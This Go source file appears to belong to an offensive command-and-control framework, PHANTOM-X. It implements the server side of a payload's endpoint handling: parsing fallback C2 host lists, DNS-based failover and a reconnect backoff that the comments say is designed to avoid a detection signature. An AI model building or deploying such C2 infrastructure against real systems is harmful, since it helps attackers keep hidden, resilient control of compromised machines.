// =============================================================================
// PHANTOM-X :: Phase 5 -- the endpoint model, server side
// =============================================================================
// endpoints.go -- The server's mirror of the payload's endpoint handling.
//
// WHY THE SERVER NEEDS THIS
//     The payload resolves a NAME every time it connects, and it tries a
//     LIST of endpoints. The server has to understand that, because:
//
//       1. The server's own --host can be a name, so that the operator
//          can point the lab at whatever address it currently has.
//       2. The server reports which endpoint a session arrived on, so
//          the audit log shows WHICH of several C2s was used.
//
//     The payload's implementation is in C (px_endpoints.c). This is the
//     Go counterpart, and the two are kept in step by the tests in
//     endpoints_test.go.
//
// -----------------------------------------------------------------------------

package main

import (
	"net"
	"strconv"
	"strings"
)

// BackoffFor returns the number of seconds to wait before the given
// attempt.
//
// The delays grow and then settle. A fixed short interval is a signature;
// a long settled interval is not. The settled value is also long enough
// that a laptop which has just changed network has finished
// reassociating by the time the next attempt happens.
func pxBackoffFor(attempt uint) uint {
	table := []uint{0, 5, 10, 20, 40, 60, 60, 60, 60}
	if attempt >= uint(len(table)) {
		return table[len(table)-1]
	}
	return table[attempt]
}

// pxEndpoint is one candidate the payload might connect to.
type pxEndpoint struct {
	Host string
	Port uint16
}

// ParseEndpointList parses a comma-separated list of host:port pairs.
//
// The order is preserved. The first entry is the primary: it is the one
// the operator chose and it is tried first every time.
func ParseEndpointList(list string) []pxEndpoint {
	out := []pxEndpoint{}
	for _, part := range strings.Split(list, ",") {
		part = strings.TrimSpace(part)
		if part == "" {
			continue
		}
		host, portStr, found := strings.Cut(part, ":")
		if !found {
			out = append(out, pxEndpoint{Host: host})
			continue
		}
		p, err := strconv.ParseUint(portStr, 10, 16)
		if err != nil {
			continue
		}
		out = append(out, pxEndpoint{Host: host, Port: uint16(p)})
	}
	return out
}

// ResolveEndpoints resolves a list of endpoints to the addresses they
// point at, preserving the order.
//
// A name with several A records contributes every address it has, which is
// how a domain with round-robin records gives failover without any extra
// configuration.
func ResolveEndpoints(endpoints []pxEndpoint, defaultPort uint16) []string {
	out := []string{}
	for _, ep := range endpoints {
		port := ep.Port
		if port == 0 {
			port = defaultPort
		}
		host := ep.Host
		if host == "" {
			continue
		}
		if ip := net.ParseIP(host); ip != nil {
			out = append(out, net.JoinHostPort(host, strconv.Itoa(int(port))))
			continue
		}
		ips, err := net.LookupIP(host)
		if err != nil {
			continue
		}
		for _, ip := range ips {
			out = append(out, net.JoinHostPort(ip.String(),
				strconv.Itoa(int(port))))
		}
	}
	return out
}

// EndpointSummary describes an endpoint list for the audit log.
func EndpointSummary(endpoints []pxEndpoint) string {
	parts := make([]string, 0, len(endpoints))
	for _, ep := range endpoints {
		if ep.Port == 0 {
			parts = append(parts, ep.Host)
			continue
		}
		parts = append(parts, ep.Host+":"+strconv.Itoa(int(ep.Port)))
	}
	return strings.Join(parts, ",")
}
